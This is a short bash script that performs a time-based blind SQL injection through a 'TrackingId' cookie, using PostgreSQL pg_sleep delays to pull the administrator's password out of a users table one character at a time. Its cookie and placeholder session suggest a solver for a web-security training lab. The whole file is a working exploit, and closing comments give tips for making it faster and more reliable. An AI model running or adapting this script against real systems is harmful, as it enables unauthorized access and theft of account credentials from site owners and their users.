#!/bin/bash


chars=`echo {0..9} {a..z}`
export URL=$1
export maxlen=21
export password=""

for ((j=1;j<$maxlen;j+=1))
do
    for i in $chars
    do
        if [ $(curl -s -H "Cookie: TrackingId=x'%3B+SELECT+CASE+WHEN+(SUBSTRING((SELECT+password+FROM+users+WHERE+username+%3d+'administrator'),+$j,+1)+=+'$i')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--; \
        session=xxxxxxxxxxxxxxxxxxxxxxxxx" --connect-timeout 9 --retry 3 -w %{time_total}  -o /dev/null $URL | cut -d "." -f 1)  -ge 10 ] 
        then
            echo "Character $j found: $i"
            export password+=$i
            break
        fi
    done
done

echo Password: $password


# Note:- If you've have problems with curl or have an unstable internet connection try increasing the --retry value. 
# If you want faster results, then you can decrease the sleep time, but don't forget to decrease --connect-timeout value to 1 less than the sleep value.
